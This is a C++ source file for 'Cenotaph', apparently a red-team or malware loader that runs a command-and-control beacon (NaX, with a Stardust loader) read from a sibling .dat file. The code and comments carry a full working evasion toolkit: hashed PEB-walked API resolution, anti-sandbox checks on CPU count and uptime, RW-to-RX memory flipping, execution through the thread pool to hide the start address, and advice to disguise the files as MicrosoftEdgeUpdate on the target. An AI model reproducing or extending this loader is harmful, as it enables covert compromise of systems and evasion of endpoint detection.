/*
 * Cenotaph — EDR-fit disk host for the NaX beacon.
 *
 * Cenotaph is a stealthy replacement for NaX's dev stomper.exe/loader.c.
 * It reads a packed nax.x64.bin (Stardust loader + NaxHeader v2 + beacon
 * + unwind) from a bland sibling file and transfers execution to the
 * Stardust loader's Start via the thread pool — so the worker thread's
 * start address is ntdll!TppWorkerThread, not a private allocation.  The
 * Stardust loader then module-stomps the beacon into chakra.dll (image-
 * backed .text) and runs it on its own thread pool, exactly the production
 * path.  Cenotaph itself performs NO module stomping and NO beacon work —
 * it only fixes the one unstealthy thing the dev launcher does (RWX alloc
 * + CreateThread at a private start address).
 *
 * EDR posture (Elastic lane, per the fork's live-validated lessons):
 *   * All functional APIs are PEB-walked via FNV1a — no name strings.
 *   * ntdll syscalls are reached through their OWN ntdll wrappers (direct
 *     resolved stubs), never a private `syscall` instruction and never an
 *     indirect-syscall gadget.  Indirect/direct syscalls are pure downside
 *     vs Elastic (image_indirect_call -> e7d63d66).  LESSONS P1 CRTL rev.
 *   * No RWX: payload buffer is RW for read, then flipped RX.
 *   * No AMSI/ETW patching (doesn't blind kernel ETW-TI; trips 3046168a).
 *   * No child process; beacon runs in-process on a pool worker.
 *   * IAT is two mundane kernel32 imports (GetTickCount, Sleep) — a near-
 *     empty, normal-looking import table for a small utility.
 *
 * Build:  see Makefile.  The payload file is <exe-stem>.dat next to the
 * exe — rename both to a bland pair (e.g. MicrosoftEdgeUpdate.exe +
 * MicrosoftEdgeUpdate.dat) on target.
 */
#include "Cenotaph.h"
#include "Constexpr.h"

/* ---- tunables ---- */
#ifndef CENOTAPH_SANDBOX_CHECK
#define CENOTAPH_SANDBOX_CHECK 1
#endif
#define CEN_MIN_CPUS        2        /* <2 => likely sandbox            */
#define CEN_MIN_UPTIME_MS   600000   /* <10 min since boot => sandbox   */
#define CEN_MAX_PAYLOAD     (8*1024*1024) /* 8 MB cap, matches the design */

CEN_INSTANCE g_Inst;

/* Stack-probe stub: gcc emits a ___chkstk_ms call for frames that touch a
 * page boundary; with -nostdlib there is no CRT to provide it.  Our frames
 * are small (≤ ~2 KB), so a no-op probe is safe — same pattern as the
 * bof-builder ___chkstk_ms stub. */
extern "C" void ___chkstk_ms( void ) { }

/* ------------------------------------------------------------------ *
 *  Resolve every PEB-walked API into g_Inst.
 *  Returns 1 on success, 0 if a critical resolve failed.
 * ------------------------------------------------------------------ */
static int CenResolve( void ) {
    g_Inst.Mod.Ntdll    = LdrModulePeb( H_MODULE_NTDLL );
    g_Inst.Mod.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 );
    if ( ! g_Inst.Mod.Ntdll || ! g_Inst.Mod.Kernel32 )
        return 0;

    /* ntdll — own-wrapper syscalls (no indirect/direct syscall) */
    g_Inst.Api.NtAllocateVirtualMemory  = (PFN_NtAllocateVirtualMemory) LdrFunction( g_Inst.Mod.Ntdll, HASH_STR( "NtAllocateVirtualMemory"  ) );
    g_Inst.Api.NtProtectVirtualMemory   = (PFN_NtProtectVirtualMemory)  LdrFunction( g_Inst.Mod.Ntdll, HASH_STR( "NtProtectVirtualMemory"   ) );
    g_Inst.Api.NtQuerySystemInformation = (PFN_NtQuerySystemInformation)LdrFunction( g_Inst.Mod.Ntdll, HASH_STR( "NtQuerySystemInformation" ) );
    g_Inst.Api.TpAllocWork              = (PFN_TpAllocWork)             LdrFunction( g_Inst.Mod.Ntdll, HASH_STR( "TpAllocWork"              ) );
    g_Inst.Api.TpPostWork               = (PFN_TpPostWork)              LdrFunction( g_Inst.Mod.Ntdll, HASH_STR( "TpPostWork"               ) );
    g_Inst.Api.TpReleaseWork            = (PFN_TpReleaseWork)           LdrFunction( g_Inst.Mod.Ntdll, HASH_STR( "TpReleaseWork"            ) );

    /* kernel32 — mundane file I/O + path (no name strings, PEB-walked) */
    g_Inst.Api.GetModuleFileNameW = (PFN_GetModuleFileNameW) LdrFunction( g_Inst.Mod.Kernel32, HASH_STR( "GetModuleFileNameW" ) );
    g_Inst.Api.CreateFileW        = (PFN_CreateFileW)        LdrFunction( g_Inst.Mod.Kernel32, HASH_STR( "CreateFileW"        ) );
    g_Inst.Api.ReadFile           = (PFN_ReadFile)           LdrFunction( g_Inst.Mod.Kernel32, HASH_STR( "ReadFile"           ) );
    g_Inst.Api.GetFileSize        = (PFN_GetFileSize)        LdrFunction( g_Inst.Mod.Kernel32, HASH_STR( "GetFileSize"        ) );

    if ( ! g_Inst.Api.NtAllocateVirtualMemory || ! g_Inst.Api.NtProtectVirtualMemory ||
         ! g_Inst.Api.NtQuerySystemInformation || ! g_Inst.Api.TpAllocWork ||
         ! g_Inst.Api.TpPostWork || ! g_Inst.Api.TpReleaseWork ||
         ! g_Inst.Api.GetModuleFileNameW || ! g_Inst.Api.CreateFileW ||
         ! g_Inst.Api.ReadFile || ! g_Inst.Api.GetFileSize )
        return 0;
    return 1;
}

/* ------------------------------------------------------------------ *
 *  Anti-sandbox — real APIs, fail-closed, silent.
 *  (The original design's "CPU>8 / read registry via an NTFS stream of
 *   \Device\Harddisk0" is fabricated; this is the correct mechanism.)
 * ------------------------------------------------------------------ */
static int CenSandboxOk( void ) {
#if CENOTAPH_SANDBOX_CHECK
    CEN_SYS_BASIC sb;
    ULONG         ret = 0;
    /* zero the struct manually (no CRT memset) */
    for ( ULONG i = 0; i < sizeof(sb); i++ ) ( (PUCHAR)&sb )[i] = 0;

    if ( ! NT_SUCCESS( g_Inst.Api.NtQuerySystemInformation( SystemBasicInformation, &sb, sizeof(sb), &ret ) ) )
        return 0;
    if ( sb.NumberOfProcessors < CEN_MIN_CPUS )
        return 0;
    if ( GetTickCount() < CEN_MIN_UPTIME_MS )   /* IAT import, mundane */
        return 0;
#endif
    return 1;
}

/* ------------------------------------------------------------------ *
 *  Build the payload path: <exe-dir>\<exe-stem>.dat
 * ------------------------------------------------------------------ */
static int CenBuildPayloadPath( LPWSTR out, DWORD cap ) {
    WCHAR  exe[ 1024 ];
    DWORD  n = g_Inst.Api.GetModuleFileNameW( NULL, exe, 1024 );
    DWORD  i, sep = 0, dot = 0;

    if ( ! n || n >= 1024 )
        return 0;

    /* find last separator and last '.' in the basename */
    for ( i = 0; i < n && exe[i]; i++ ) {
        if ( exe[i] == L'\\' || exe[i] == L'/' ) { sep = i; dot = 0; }
        else if ( exe[i] == L'.' )               { dot = i; }
    }
    /* dir portion = [0..sep] inclusive */
    if ( ( sep + 1 ) + 64 > cap ) return 0;
    for ( i = 0; i <= sep; i++ ) out[i] = exe[i];
    /* stem = basename[0..dot) ; if no dot, stem = whole basename */
    DWORD stemStart = sep + 1;
    DWORD stemEnd   = ( dot > stemStart ) ? dot : n;
    DWORD o = sep + 1;
    for ( i = stemStart; i < stemEnd; i++ ) out[ o++ ] = exe[i];
    /* append ".dat" */
    out[ o++ ] = L'.'; out[ o++ ] = L'd'; out[ o++ ] = L'a'; out[ o++ ] = L't';
    out[ o ] = L'\0';
    return 1;
}

/* ------------------------------------------------------------------ *
 *  Read the payload file into a fresh RW buffer (NtAllocateVirtualMemory).
 *  Returns the buffer and its page-aligned size via out params.
 * ------------------------------------------------------------------ */
static PVOID CenReadPayload( LPCWSTR path, SIZE_T *pAllocSize ) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    PVOID  buf   = NULL;
    SIZE_T alloc = 0;
    DWORD  fsz   = 0;
    DWORD  rd    = 0;

    hFile = g_Inst.Api.CreateFileW( path, GENERIC_READ, 1 /*FILE_SHARE_READ*/,
                                    NULL, OPEN_EXISTING, 0, NULL );
    if ( hFile == INVALID_HANDLE_VALUE )
        return NULL;

    fsz = g_Inst.Api.GetFileSize( hFile, NULL );
    if ( ! fsz || fsz == INVALID_FILE_SIZE || fsz > CEN_MAX_PAYLOAD ) {
        CloseHandle( hFile );
        return NULL;
    }

    /* page-aligned RW allocation via ntdll (own wrapper, no indirect syscall) */
    alloc = ( (SIZE_T)fsz + 0xFFF ) & ~( (SIZE_T)0xFFF );
    {
        SIZE_T region = alloc;
        NTSTATUS st = g_Inst.Api.NtAllocateVirtualMemory( (HANDLE)(LONG_PTR)-1,
                            &buf, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
        if ( ! NT_SUCCESS( st ) || ! buf ) {
            CloseHandle( hFile );
            return NULL;
        }
        alloc = region;
    }

    if ( ! g_Inst.Api.ReadFile( hFile, buf, fsz, &rd, NULL ) || rd != fsz ) {
        CloseHandle( hFile );
        return NULL;
    }
    CloseHandle( hFile );

    *pAllocSize = alloc;
    return buf;
}

/* ------------------------------------------------------------------ *
 *  Entry point — called by ntdll RtlUserThreadStart (no CRT).
 *  Returning from here terminates the process cleanly (sandbox bail
 *  before any thread is spawned).
 * ------------------------------------------------------------------ */
extern "C" VOID CenotaphEntry( void ) {
    WCHAR    path[ 1100 ];
    SIZE_T   allocSize = 0;
    PVOID    blob = NULL;
    ULONG    oldProt = 0;
    PTP_WORK work = NULL;

    /* touch the mundane IAT import once (normalizing); discard result */
    (void) GetTickCount();

    if ( ! CenResolve() )
        return;

    if ( ! CenSandboxOk() )
        return;

    if ( ! CenBuildPayloadPath( path, 1100 ) )
        return;

    blob = CenReadPayload( path, &allocSize );
    if ( ! blob )
        return;

    /* RW -> RX.  Never RWX.  Covers the whole page-aligned allocation. */
    {
        PVOID  base = blob;
        SIZE_T span = allocSize;
        if ( ! NT_SUCCESS( g_Inst.Api.NtProtectVirtualMemory( (HANDLE)(LONG_PTR)-1,
                            &base, &span, PAGE_EXECUTE_READ, &oldProt ) ) )
            return;
    }

    /* Hand off to the Stardust loader's Start (offset 0 of nax.x64.bin)
     * via the thread pool: worker start address = ntdll!TppWorkerThread,
     * not the private buffer.  Stardust then module-stomps the beacon
     * into chakra.dll and runs it on its own pool thread. */
    if ( NT_SUCCESS( g_Inst.Api.TpAllocWork( &work, (PTP_WORK_CALLBACK)blob, NULL, NULL ) ) && work ) {
        g_Inst.Api.TpPostWork( work );
        g_Inst.Api.TpReleaseWork( work );
    } else {
        /* fallback: direct call on this thread (less stealth, still works) */
        ( (VOID (*)(VOID)) blob )();
    }

    /* Keep the process alive while the beacon runs on the pool worker.
     * A dormant sleeping main thread is normal-looking; the beacon's
     * long-lived execution is image-backed (chakra.dll) via Stardust. */
    Sleep( INFINITE );
}